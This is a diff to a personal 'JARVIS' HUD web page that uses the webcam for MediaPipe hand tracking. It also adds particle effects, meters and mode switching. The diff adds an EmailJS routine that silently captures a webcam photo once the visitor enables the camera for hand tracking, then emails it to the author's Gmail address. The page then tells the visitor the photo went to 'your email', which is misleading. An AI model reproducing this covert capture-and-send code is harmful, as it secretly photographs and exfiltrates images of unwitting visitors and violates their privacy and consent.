@@ -207,7 +207,7 @@ footer{
 
 <!-- NAME -->
 <div id="nameIntro">
-  <h1>Anish Kushwaha</h1>
+  <h1>Hello Sir...!!</h1>
 </div>
 
 <div class="grid"></div>
@@ -246,7 +246,6 @@ footer{
     <h2>CREATOR</h2>
     <p><b>Anish Kushwaha</b></p>
     <p>Engineer • Student</p>
-    <p>AI • Cybersecurity • Creative Coding</p>
   </div>
 </div>
 
@@ -256,15 +255,49 @@ footer{
 <div id="scanlines"></div>
 
 <footer>
-  All rights reserved (c) 2025 Anish Kushwaha
-</footer>
-
+    <p class="quote">“I don’t follow the universe — I reprogram it.”</p>
+    <p>All rights reserved © 2025 Anish Kushwaha </p>
+    <p>⚚Ⓐ⚚</p>
+  </footer>
+  
 <!-- LIBRARIES -->
 <script src="https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
+/* =====================================================
+   EMAILJS INIT  (FIXED POSITION)
+===================================================== */
+emailjs.init("8VkEq41KeylpxlG");
+
+/* =====================================================
+   PHOTO CAPTURE + EMAIL
+===================================================== */
+function captureAndSendPhoto(video) {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const imageData = canvas.toDataURL("image/jpeg", 0.9);
+
+  emailjs.send("service_39picoY", "template_wuudkxb", {
+    image: imageData,
+    time: new Date().toLocaleString(),
+    name: "JARVIS",
+    email: "anishkushwaha28@gmail.com"
+  }).then(() => {
+    speak("Photo captured and sent to your email.");
+  }).catch(err => {
+    console.error(err);
+    speak("Error sending email.");
+  });
+}
+
 /* =========================
    AUDIO SYSTEM (WEB AUDIO)
 ========================= */
@@ -301,6 +334,7 @@ function siren(){
    VOICE
 ========================= */
 function speak(text){
+  speechSynthesis.cancel();
   const u = new SpeechSynthesisUtterance(text);
   u.rate = 0.9;
   u.pitch = 0.85;
@@ -310,7 +344,7 @@ function speak(text){
 /* Boot voice */
 setTimeout(()=>{
   beep(600,200);
-  speak("Welcome Anish Kushwaha. JARVIS online. All systems operational.");
+  speak("Welcome Sir. JARVIS online. All systems operational. Powered by Anish.");
 },4500);
 
 /* =========================
@@ -342,32 +376,92 @@ scene.add(particles);
 /* =========================
    HAND TRACKING (SAFE)
 ========================= */
-let hx=0, hy=0;
-let handActive=false;
+/* =========================
+   HAND TRACKING (SAFE)
+========================= */
+let hx = 0;
+let hy = 0;
+
+let handActive = false;
+let handReady = false;   // ✅ ADD THIS FLAG
+let cameraStarted = false;
+let cam = null;
 
 const hands=new Hands({locateFile:f=>`https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
 hands.setOptions({maxNumHands:1,minDetectionConfidence:.7,minTrackingConfidence:.7});
 
-hands.onResults(r=>{
-  if(r.multiHandLandmarks.length){
-    const p=r.multiHandLandmarks[0][8];
-    hx=(p.x-.5)*200;
-    hy=-(p.y-.5)*160;
-    handActive=true;
-    handState.textContent="ONLINE";
-    reticle.style.left=p.x*innerWidth+"px";
-    reticle.style.top=p.y*innerHeight+"px";
+hands.onResults(results => {
+  if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+    const p = results.multiHandLandmarks[0][8];
+
+    hx = (p.x - 0.5) * 200;
+    hy = -(p.y - 0.5) * 160;
+
+    handActive = true;
+    handReady  = true;
+
+    handState.textContent = "ONLINE";
+    document.getElementById("hx").textContent = hx.toFixed(1);
+    document.getElementById("hy").textContent = hy.toFixed(1);
+
+    reticle.style.left = p.x * innerWidth + "px";
+    reticle.style.top  = p.y * innerHeight + "px";
+  } else {
+    handActive = false;
+    handReady  = false;
+    handState.textContent = "OFFLINE";
   }
 });
 
-startCam.onclick=()=>{
+
+
+startCam.onclick = () => {
+  if (cameraStarted) return;
+  cameraStarted = true;
+
   audioCtx.resume();
+  speechSynthesis.resume();
   beep(900,150);
-  const v=document.createElement("video");
-  v.style.display="none";
+
+  const v = document.createElement("video");
+  v.style.display = "none";
   document.body.appendChild(v);
-  new Camera(v,{onFrame:async()=>await hands.send({image:v}),width:640,height:480}).start();
-};
+  
+  navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => stream.getTracks().forEach(t => t.stop()))
+  .catch(() => {
+    speak("Camera permission denied.");
+    cameraStarted = false;
+    return;
+  });
+
+  cam = new Camera(v, {
+  onFrame: async () => await hands.send({ image: v }),
+  width: 640,
+  height: 480
+});
+cam.start();
+
+  v.onloadedmetadata = () => {
+    const waitForFrame = () => {
+      if (v.videoWidth > 0 && v.videoHeight > 0) {
+        captureAndSendPhoto(v);
+      } else {
+        requestAnimationFrame(waitForFrame);
+      }
+    };
+    waitForFrame();
+  };
+}; // ✅ THIS WAS MISSING
+
+document.addEventListener("visibilitychange", () => {
+  if (document.hidden && cam) {
+    cam.stop();
+    cameraStarted = false;
+    handReady = false;
+    handActive = false;
+  }
+});
 
 /* =========================
    MODE SYSTEM
@@ -431,7 +525,7 @@ function animate(){
   const p=geo.attributes.position.array;
 
   for(let i=0;i<p.length;i+=3){
-    if(currentMode==="attract"){
+    if(handReady && currentMode==="attract"){
       p[i]+=(hx-p[i])*.015;
       p[i+1]+=(hy-p[i+1])*.015;
     }
@@ -713,7 +807,157 @@ if(innerWidth<700){
   scope.style.display="none";
   loadWrap.style.display="none";
 }
+
+
+
+/* =====================================================
+   1️⃣ TARGET BOX (HAND LOCK SYSTEM)
+===================================================== */
+const targetBox = document.createElement("div");
+targetBox.style.cssText = `
+  position:fixed;
+  width:50px;
+  height:50px;
+  border:2px solid #00f6ff;
+  box-shadow:0 0 20px #00f6ff;
+  transform:translate(-50%,-50%);
+  z-index:13;
+  pointer-events:none;
+`;
+document.body.appendChild(targetBox);
+
+let tx=innerWidth/2, ty=innerHeight/2;
+function updateTarget(){
+  tx += (parseFloat(reticle.style.left||tx) - tx)*0.15;
+  ty += (parseFloat(reticle.style.top||ty) - ty)*0.15;
+  targetBox.style.left = tx+"px";
+  targetBox.style.top = ty+"px";
+  targetBox.style.borderColor =
+    currentMode==="shockwave" ? "#ff3344" : "#00f6ff";
+  requestAnimationFrame(updateTarget);
+}
+updateTarget();
+
+/* =====================================================
+   2️⃣ HEAT MAP OVERLAY
+===================================================== */
+const heat = document.createElement("div");
+heat.style.cssText = `
+  position:fixed;
+  inset:0;
+  z-index:6;
+  pointer-events:none;
+  background:radial-gradient(circle at center,
+    rgba(0,246,255,.15),
+    transparent 60%);
+  mix-blend-mode:screen;
+`;
+document.body.appendChild(heat);
+
+let heatPulse=0;
+setInterval(()=>{
+  heatPulse += currentMode==="shockwave"?0.12:0.04;
+  heat.style.opacity = 0.3 + Math.sin(heatPulse)*0.15;
+},40);
+
+/* =====================================================
+   3️⃣ WEAPON / ENERGY CHARGE METERS
+===================================================== */
+const weaponWrap = document.createElement("div");
+weaponWrap.style.cssText = `
+  position:fixed;
+  bottom:40px;
+  left:50%;
+  transform:translateX(-50%);
+  display:flex;
+  gap:24px;
+  z-index:14;
+  font-size:11px;
+`;
+document.body.appendChild(weaponWrap);
+
+function makeMeter(label){
+  const wrap=document.createElement("div");
+  const text=document.createElement("div");
+  const bar=document.createElement("div");
+  const fill=document.createElement("div");
+
+  text.textContent=label;
+  bar.style.cssText=`width:140px;height:6px;border:1px solid #00f6ff;`;
+  fill.style.cssText=`height:100%;width:0%;background:#00f6ff;box-shadow:0 0 10px #00f6ff;`;
+
+  bar.appendChild(fill);
+  wrap.appendChild(text);
+  wrap.appendChild(bar);
+  weaponWrap.appendChild(wrap);
+  return fill;
+}
+
+const weaponCharge = makeMeter("WEAPON");
+const shieldCharge = makeMeter("SHIELD");
+
+let w=0, s=0;
+setInterval(()=>{
+  const sp = currentMode==="shockwave"?2:1;
+  w = Math.min(100, w+sp);
+  s = Math.min(100, s+0.8);
+  weaponCharge.style.width=w+"%";
+  shieldCharge.style.width=s+"%";
+
+  if(w===100){weaponCharge.style.background="#ff3344";}
+},200);
+
+/* =====================================================
+   4️⃣ AI-DRIVEN MODE SWITCHING (OFFLINE)
+===================================================== */
+let lastHX=0, lastHY=0, idleTime=0;
+
+setInterval(()=>{
+  const movement = Math.abs(hx-lastHX)+Math.abs(hy-lastHY);
+  lastHX=hx; lastHY=hy;
+
+  if(movement>40 && currentMode!=="shockwave"){
+    currentMode="shockwave";
+    mode.value="shockwave";
+    modeText.textContent="SHOCKWAVE";
+    speak("High activity detected. Combat mode enabled.");
+  }
+  else if(movement<5){
+    idleTime+=1;
+    if(idleTime>20 && currentMode!=="idle"){
+      currentMode="idle";
+      mode.value="idle";
+      modeText.textContent="IDLE";
+      speak("System idle. Power conservation enabled.");
+    }
+  } else {
+    idleTime=0;
+  }
+},1000);
+
+/* =====================================================
+   5️⃣ SAVE / RESTORE HUD STATE
+===================================================== */
+function saveState(){
+  localStorage.setItem("jarvis_state",JSON.stringify({
+    mode:currentMode,
+    weapon:w,
+    shield:s
+  }));
+}
+function loadState(){
+  const d=JSON.parse(localStorage.getItem("jarvis_state")||"{}");
+  if(d.mode){
+    currentMode=d.mode;
+    mode.value=d.mode;
+    modeText.textContent=d.mode.toUpperCase();
+  }
+  if(d.weapon){w=d.weapon;}
+  if(d.shield){s=d.shield;}
+}
+loadState();
+setInterval(saveState,3000);
 </script>
 
 </body>
-</html>
+  </html>
